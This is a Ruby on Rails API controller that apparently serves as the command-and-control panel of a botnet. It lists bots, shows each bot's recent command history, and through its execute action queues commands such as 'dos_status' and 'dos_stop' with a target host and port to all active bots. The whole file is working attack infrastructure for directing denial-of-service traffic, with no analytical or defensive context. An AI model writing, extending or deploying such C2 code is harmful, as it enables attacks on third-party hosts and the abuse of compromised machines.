# frozen_string_literal: true

module Api::V1
  class BotsController < ApplicationController
    include ::CcHelper
    include ::ValidationsHelper

    def index
      b = Bot.all.map { |e| BotPresenter.new(e).resp_json }
      render_response_json(content: b)

    rescue StandardError => e
      process_error(e)
    end

    def show
      limit_size = bot_params[:limit_size].blank? ? 10 : bot_params[:limit_size].to_i
      limit_size = limit_size > 100 || limit_size <= 0 ? 10 : limit_size

      b = Bot.find_by(code: bot_params[:code])
      render_response_json(content: BotPresenter.new(b, b.bot_command_pools.get_last(limit: limit_size)).resp_json)

    rescue StandardError => e
      process_error(e)
    end

    def commands
      c = BotCommandPool.available_commands.map { |k, v| CommandPresenter.new(k, v).resp_json }
      render_response_json(content: c)

    rescue StandardError => e
      process_error(e)
    end

    def execute
      bots = Bot.where(code: command_params[:bots], active: true, bot_status: BotStatus.operating)
      c = BotCommandPool.available_commands[command_params[:code].to_sym]

      raise CustomError.new(message: 'Bad Command Option') if c.blank?
      valid_host?(command_params[:host]) if !['dos_status', 'dos_stop'].include?(command_params[:code])
      raise CustomError.new(message: 'Bad Port') if command_params[:port].present? && valid_port?(command_params[:port])

      bots.each do |b|
        b.bot_command_pools.create(
          command: command_params[:code],
          metadata: {
            command: command_params[:code],
            type: c[:type],
            type_2: c[:type_2],
            type_3: c[:type_3],
            host_target: command_params[:host],
            port: command_params[:port]
          }
        )
      end

      render_response_json(content: { message: 'Some bots may not active, only those ones active will run the command' })

    rescue StandardError => e
      process_error(e)
    end

    private

    def bot_params
      params.permit(:code, :limit_size)
    end

    def command_params
      params.permit(:code, :host, :port, bots: [])
    end

    def process_error(e)
      report_to_cc(type: 'invalid_command', exception: e)

      if e.is_a?(CustomError)
        error = {
          code: e.code,
          msg: e.message
        }
      else
        error = {
          code: 1000,
          msg: 'Bad operation'
        }
      end

      render_response_json(error: error, status: :service_unavailable)
    end
  end
end
